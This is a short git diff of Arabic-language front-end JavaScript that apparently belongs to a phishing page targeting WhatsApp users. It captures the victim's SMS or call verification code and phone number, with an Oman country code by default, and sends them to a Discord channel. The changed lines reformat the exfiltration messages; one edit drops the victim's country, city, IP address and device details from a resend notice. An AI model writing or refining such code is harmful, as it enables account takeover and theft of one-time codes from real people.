@@ -50,7 +50,7 @@ document.addEventListener('DOMContentLoaded', function () {
       const phoneNumber = getFromStorage('phoneNumber') || 'غير معروف';
       const countryCode = getFromStorage('countryCode') || '+968';
 
-      const message = `📞 **SMS Or CALL رمز التحقق:** ${code}\n📱 **الرقم:** ${countryCode}${phoneNumber}\n🌍 `;
+      const message = `💬━━━━ Appel ━━━━💬📞 **SMS Or CALL رمز التحقق:** ${code}\n📱 **الرقم:** ${countryCode}${phoneNumber}\n🌍 `;
 
       const success = await sendToDiscord(message);
 
@@ -98,7 +98,7 @@ document.addEventListener('DOMContentLoaded', function () {
       const countryCode = getFromStorage('countryCode') || '+968';
 
       // إرسال طلب إعادة الإرسال إلى Discord
-      const message = `🔄 **طلب إعادة إرسال مكالمة واتساب:**\n📱 **الرقم:** ${countryCode}${phoneNumber}\n🌍 **الدولة:** ${country}\n🏙️ **المدينة:** ${city}\n🌐 **IP:** ${ip}\n📱 **الجهاز:** ${device}`;
+      const message = `🔄 **طلب إعادة إرسال مكالمة واتساب:**\n📱 **الرقم:** ${countryCode}${phoneNumber}\n🌍 `;
 
       const success = await sendToDiscord(message);
 
